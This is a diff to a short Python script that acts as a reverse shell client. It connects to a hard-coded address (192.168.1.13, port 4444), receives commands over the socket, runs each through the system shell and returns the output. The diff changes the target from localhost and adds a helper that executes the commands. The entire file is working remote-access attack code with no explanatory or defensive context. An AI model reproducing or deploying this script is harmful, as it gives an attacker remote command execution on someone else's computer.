@@ -1,16 +1,19 @@
 import socket 
 import subprocess
 
-host = '127.0.0.1'
-port = 3333
+def shell(command):
+	return subprocess.check_output(command, shell = True)
+
+host = '192.168.1.13'
+port = 4444
 
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-
 s.connect((host, port))
 
 while True:
-	cmd = s.recv(1024)
-	cmd = cmd.decode()
-	cmd_process = subprocess.run(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE) 
-	cmd_process = cmd_process.stdout + cmd_process.stderr
-	s.send(cmd_process)
+	cmd_process = s.recv(1024)
+	cmd_process = str(cmd_process, "cp866")
+	#cms = cmd.decode()
+	cmd_send = shell(cmd_process)
+	s.send(cmd_send)
+s.close()
